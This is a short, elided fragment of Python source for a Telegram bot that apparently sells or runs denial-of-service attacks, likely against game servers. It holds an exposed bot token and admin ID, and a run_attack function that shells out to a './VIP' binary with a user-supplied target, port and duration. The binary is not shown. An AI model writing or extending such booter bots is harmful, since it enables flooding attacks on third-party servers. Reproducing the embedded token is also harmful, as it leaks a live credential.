...
bot_token = '7289992579:AAHIXcVEzHAMTFOOPxSZfTOxRfNHcojzRr0'  # Replace with your bot token
...
ADMIN_ID = 6135948216  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./VIP {target} {port} {attack_time} 20"
...
def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @LORDBGMIOWNEF: {ADMIN_ID}")
